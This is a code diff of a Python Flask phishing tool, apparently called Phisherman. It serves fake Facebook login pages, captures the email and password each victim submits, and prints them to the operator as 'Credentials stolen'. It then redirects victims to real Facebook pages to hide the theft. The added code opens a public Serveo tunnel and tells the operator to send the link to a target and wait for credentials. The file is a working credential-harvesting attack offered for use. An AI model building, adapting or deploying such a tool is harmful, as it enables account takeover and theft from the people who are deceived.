@@ -1,46 +1,55 @@
-from flask import Flask, render_template, request, redirect, url_for
-import logging, socket, argparse
+#!/usr/bin/env python3
+import sys
+import os, subprocess
 
-# ANSI color codes
-RESET = '\033[0m'
-GREEN = '\033[92m'
-CYAN = '\033[96m'
-YELLOW = '\033[93m'
-MAGENTA = '\033[95m'
+# Add the parent directory to sys.path
+current_dir = os.path.dirname(os.path.abspath(__file__))
+parent_dir = os.path.dirname(current_dir)
+sys.path.append(parent_dir)
 
-parser = argparse.ArgumentParser(description='Phisherman Phishing Tool')
-"""parser.add_argument('serveo', metavar='Serveo Link', type=str, help='The Link For Serveo' default='')
-parser.add_argument('ngrok', metavar='Ngrok Link', type=str, help='The Link For Ngrok' default='')
+import subprocess
+import json
+import logging
+from flask import Flask, render_template, request, redirect
+from color_functions import type_text, display_template
+from color_functions import cyan as cyan, magenta as magenta, reset as reset, yellow as yellow, green as green, light_blue as light_blue
 
-parser.add_argument('template', metavar='Phishing Template', type=str, help='The Filename For The Phishing Page', default='01')
+def clear_screen():
+    with open('doom.txt', 'r') as doom_file:
+      doom_content = doom_file.read()
+      cls= subprocess.run(['clear'])
+      print(f"{green}{doom_content}{reset}")
+      if not doom_content:
+        return
+    if not cls:
+      subprocess.run(['cls'])
+    return
 
-args = parser.parse_args()
-"""
-#page_template = args.template
+# Read templates from JSON manifest
+with open('manifest.json', 'r') as manifest_file:
+    manifest = json.load(manifest_file)
+    templates = manifest.get('templates', [])
 
 app = Flask(__name__, template_folder='./', static_url_path='/static')
 
 @app.route('/')
 def home():
     ip = '[...]'
-    print(f"\n{GREEN}    ✔️Target captured...{RESET}")
-    print(f"{CYAN} IP: {ip}{RESET}")
+    print(f"\n{light_blue}    ✔️Target captured...{reset}")
+    print(f"{cyan} IP: {ip}{reset}")
     return render_template(f'{page}.html')
 
 @app.route('/login', methods=['POST'])
 def login():
     email = request.form.get('user')
     password = request.form.get('pwd')
-    print(email)
     if email and password:
-        print(f"{YELLOW}          --------------------- {RESET}")
-        print(f"{GREEN}          ✔️ Credentials stolen...{RESET}")
-        print(f'{CYAN}          -> Email:|{email}|{RESET}')
-        print(f'{CYAN}          -> Password:|{password}|{RESET}')
-        save_credentials(email, password)
-        print(f'{GREEN}    ️      ✔️ Credentials saved at credentials.txt{RESET}')
-        print(f"{YELLOW}          --------------------- {RESET}\n")
-        return redirect('https://viewpoints.fb.com/')
+        print("{} Credentials stolen{}".format(light_blue, reset))
+        print(f"  {yellow}[{green}~{yellow}] {magenta}Email   {cyan}:{green}{email}{reset}")
+        print(f"  {yellow}[{green}~{yellow}] {magenta}Password{cyan}:{green}{password}{reset}")
+
+        print()
+        return redirect('https://fb.com/01')
     return redirect('https://www.facebook.com/recover')
 
 def get_local_ip():
@@ -83,21 +92,41 @@ if __name__ == '__main__':
     app.logger.disabled = True
     alog = logging.getLogger('werkzeug')
     alog.setLevel(logging.ERROR)
-    page = input(f"{MAGENTA}    Enter template number >>>  {RESET}")
-
-    print(f"{MAGENTA}        👉 Select any of the following to obtain the link {RESET}")
-    print(f"{CYAN}          ------------------------------- {RESET}")
-    print(f"{CYAN}          | Code   |  Name             | {RESET}")
-    print(f"{CYAN}          ------------------------------- {RESET}")
-    print(f"{CYAN}          | {YELLOW}01     {CYAN}|  {MAGENTA}Localhost(Local) {CYAN}| {RESET}")
-    print(f"{CYAN}          | {YELLOW}02     {CYAN}|  {MAGENTA}Serveo(Public)   {CYAN}| {RESET}")
-    print(f"{CYAN}          ------------------------------- {RESET}\n")
-
-    public_url = input(f"{MAGENTA}    >>> {RESET}")
+    alog.disabled = True
+    
+    print(f"{light_blue}Select an option")
+    page = input(f"{magenta} >>> {cyan}")
+    print()
+    
+    clear_screen()
+    print(f"{yellow}Localhost link is appears only on your device{reset}")
+    print(f"{reset}")
+    print(f"{yellow}Serveo provides a temporary public link -  that appears on the internet{reset}")
+    print()
+    print(f"{yellow}[{reset}01{yellow}] {reset}Localhost 🏠")
+    print()
+    print(f"{yellow}[{reset}02{yellow}] {reset}Serveo 🛜")
+    print()
+    print(f"{light_blue}Select an option")
+    print()
+    public_url = input(f"{magenta}>>> {cyan}")
+    
+    clear_screen()
 
     if public_url == "02":
-        print(f"{GREEN}    Starting Serveo Tunnel ...{RESET}")
+        print(f"{reset}{green}Starting Serveo Tunnel ...{reset}")
+        print(f"{light_blue}Generating public link...")
         from expose import Serveo_Link
-        Serveo_Link()
+        serveo_url = Serveo_Link()
+        clear_screen()
+        print(f"👉{light_blue}URL:{green} https://{serveo_url}{reset}")
+        print()
+        print(f"{yellow} Copy the link and send URL with to target and wait for credentials {reset}")
+        print()
+        print(f"{light_blue}Waiting for credents (phone, passwords etc.) :{reset}")
+    else:
+        print(f"{green}Link is 127.0.0.1:4511")
 
-    app.run(host='0.0.0.0', port=2095)
+    cli = sys.modules['flask.cli']
+    cli.show_server_banner = lambda *x: None
+    app.run(host='0.0.0.0', port=4511)
